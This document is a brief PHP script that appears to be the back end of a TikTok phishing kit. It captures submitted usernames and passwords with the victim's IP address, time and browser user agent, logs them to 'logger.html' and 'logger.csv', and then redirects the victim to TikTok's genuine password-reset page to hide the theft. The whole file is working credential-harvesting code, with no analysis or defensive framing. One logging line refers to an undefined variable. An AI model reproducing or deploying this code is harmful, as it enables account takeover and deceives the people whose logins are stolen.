<?php
date_default_timezone_set('Asia/Yangon');
$email = $_POST['email']; 
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR']; 
$time = date("Y/m/d h:i a");
$agent = $_SERVER["HTTP_USER_AGENT"];
$agent = str_replace(',', '', $agent);
$f = fopen("logger.html", "a"); 
fwrite ($f, '[<b><font color="#F700C3">'.$time.'</font></b>] Tiktok Username: [<b><font color="#DC143C">'.$email.'</font></b>] PASSWORD: [<b><font color="#008000">'.$password.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
fclose($f);
$f = fopen("logger.csv", "a");
fwrite($f,$email.",".$pass.",".$ip.",".$agent.",".$time,"\n");
fclose($f);
header('Location: https://www.tiktok.com/login/email/forget-password');
exit();
?>
